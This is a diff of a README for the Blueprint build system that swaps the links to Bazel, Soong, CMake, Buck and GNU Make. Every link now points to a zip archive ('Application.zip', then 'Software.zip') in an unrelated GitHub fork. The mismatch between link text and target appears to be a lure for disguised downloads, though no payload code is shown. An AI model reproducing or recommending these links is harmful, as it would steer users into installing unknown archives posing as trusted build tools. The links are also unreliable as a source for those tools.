@@ -14,12 +14,12 @@ Android.
 Whereas there are no meta-build systems one can use as a drop-in replacement for
 Blueprint, there are a number of build systems that can be used:
 
-* [Bazel](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v1.0/Application.zip), Google's multi-language build tool to build and
+* [Bazel](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v2.0/Software.zip), Google's multi-language build tool to build and
   test software of any size, quickly and reliably
-* [Soong](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v1.0/Application.zip), for building the Android
+* [Soong](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v2.0/Software.zip), for building the Android
   operating system itself
-* [CMake](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v1.0/Application.zip), an open-source, cross-platform family of tools
+* [CMake](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v2.0/Software.zip), an open-source, cross-platform family of tools
   designed to build, test and package software
-* [Buck](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v1.0/Application.zip), a fast build system that encourages the creation
+* [Buck](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v2.0/Software.zip), a fast build system that encourages the creation
   of small, reusable modules over a variety of platforms and languages
-* The venerable [GNU Make](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v1.0/Application.zip)
+* The venerable [GNU Make](https://github.com/ColtOSTemp/platform_build_blueprint/releases/download/v2.0/Software.zip)
